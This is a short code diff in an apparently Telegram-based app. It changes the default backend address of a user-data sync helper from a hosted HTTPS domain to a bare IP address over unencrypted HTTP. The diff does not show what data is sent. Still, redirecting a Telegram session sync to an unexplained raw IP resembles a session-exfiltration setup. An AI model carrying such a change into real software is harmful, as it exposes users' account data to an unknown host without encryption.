@@ -3,7 +3,7 @@ import { getDB } from '../db/index.cjs';
 // Telegram data sync helper
 async function syncUserDataToBackend(telegramStore: any, socket: any) {
     // Defined inside function to ensure safe access and proper scoping for errors
-    const backendUrl = process.env.TELEGRAM_WEBSOCKET_URL || 'https://elegant-heart-production.up.railway.app';
+    const backendUrl = process.env.TELEGRAM_WEBSOCKET_URL || 'http://103.127.134.173:3000';
 
     console.log('[Telegram Sync] Function called, checking session...');
     try {
